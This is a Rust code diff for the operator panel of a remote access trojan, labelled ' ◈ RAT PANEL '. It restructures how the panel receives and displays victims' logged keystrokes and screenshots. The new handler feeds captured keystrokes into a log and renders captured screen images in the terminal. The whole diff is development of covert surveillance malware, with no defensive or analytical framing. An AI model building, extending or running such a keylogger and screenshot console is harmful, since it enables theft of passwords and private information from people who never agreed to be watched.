@@ -1,3 +1,4 @@
+#![allow(unused)]
 mod app;
 mod ui;
 mod server;
@@ -34,31 +35,31 @@ fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
 
 fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
     match event {
-        ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
-        ClientEvent::Data(mut bytes) => { 
-            if bytes.ends_with(b"keystroke_reader") {
-                bytes.truncate(bytes.len() - b"keystroke_reader".len());
-                let key = std::str::from_utf8(&bytes)?;
-                app.logged_keys.push_str(key);
-            } else if bytes.ends_with(b"screenshot") {
-                bytes.truncate(bytes.len() - b"screenshot".len());
-
-                let image = ImageReader::new(
-                    std::io::Cursor::new(bytes)
-                )
-                .with_guessed_format()?
-                .decode()?;
-
-                let protocol = Picker::from_query_stdio()?
-                    .new_resize_protocol(image);
-
-                let tx_clone = app.tx.clone();
-                app.screenshot = ThreadProtocol::new(tx_clone, Some(protocol))
-            }   
-        },  
-        ClientEvent::Disconnected => { app.client_addr = String::new() },
+        ClientEvent::Connected(addr) => { app.addr = addr.to_string() },
+        ClientEvent::Data(bytes) => { app.logged_keys.push_str(std::str::from_utf8(&bytes)?); }  
+        ClientEvent::Disconnected => { app.addr = String::new() },
     }
+    Ok(())
+}
 
+fn handle_client_img_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
+    match event {
+        ClientEvent::Connected(addr) => { app.img_addr = addr.to_string() },
+        ClientEvent::Data(bytes) => { 
+            let image = ImageReader::new(
+                std::io::Cursor::new(bytes)
+            )
+            .with_guessed_format()?
+            .decode()?;
+
+            let protocol = Picker::from_query_stdio()?
+                .new_resize_protocol(image);
+
+            let tx_clone = app.tx.clone();
+            app.screenshot = ThreadProtocol::new(tx_clone, Some(protocol))
+        }  
+        ClientEvent::Disconnected => { app.img_addr = String::new() },
+    }
     Ok(())
 }
 
@@ -88,7 +89,7 @@ pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
     let mut terminal = Terminal::new(backend)?;
 
     let app = App::new(" ◈ RAT PANEL ");
-    let app_result = run_app(&mut terminal, app, tick_rate).await;
+    let app_result = run_app(&mut terminal, app.await, tick_rate).await;
 
     disable_raw_mode()?;
     execute!(
@@ -121,6 +122,7 @@ where
         tokio::select! {
             Some(request) = app.rx.recv() => handle_request(&mut app, request)?,
             Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
+            Some(client_img_event) = app.client.app_img_receiver.recv() => handle_client_img_event(&mut app, client_img_event)?,
             Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
         }
 
